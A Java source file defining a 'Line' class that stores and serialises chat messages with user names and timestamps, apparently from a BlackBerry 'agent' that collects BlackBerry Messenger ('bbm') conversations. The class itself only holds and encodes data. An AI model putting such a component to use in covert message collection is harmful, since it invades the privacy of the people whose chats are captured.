//#preprocess
package blackberry.agent.im;

import java.io.IOException;
import java.util.Date;

import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

public class Line {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Line", DebugLevel.VERBOSE);
    //#endif

    User user;
    private String message;
    static String subject = "";
    static String program = "bbm";
    Date timestamp;

    public Line(User user, String message) {
        this.user = user;
        this.setMessage(message);
        timestamp = new Date();
    }

    public int hashCode() {
        return user.hashCode() ^ getMessage().hashCode();
    }

    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }

        if (!(obj instanceof Line)) {
            return false;
        }

        Line line = (Line) obj;
        return user.equals(line.user) && getMessage().equals(line.getMessage());

    }

    public void setMessage(String message) {
        this.message = message;
    }

    public String getMessage() {
        return message;
    }

    public static Line unserialize(byte[] content) {

        DataBuffer buffer = new DataBuffer(content, 0, content.length, false);

        String name;
        try {
            name = new String(buffer.readByteArray());

            String message = new String(buffer.readByteArray());

            User user = new User(name, "", "");

            Line line = new Line(user, message);
            return line;
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error("unserialize: " + e);
            //#endif
        }

        return null;
    }

    public byte[] serialize() {

        //#ifdef DBC
        Check.requires(user != null, "serialize,  null user");
        Check.requires(message != null, "serialize,  null message");
        //#endif
        DataBuffer buffer = new DataBuffer();

        buffer.writeByteArray(user.name.getBytes());
        buffer.writeByteArray(message.getBytes());

        return buffer.getArray();
    }

    public String toString() {
        return user.name + " : " + message;

    }

}
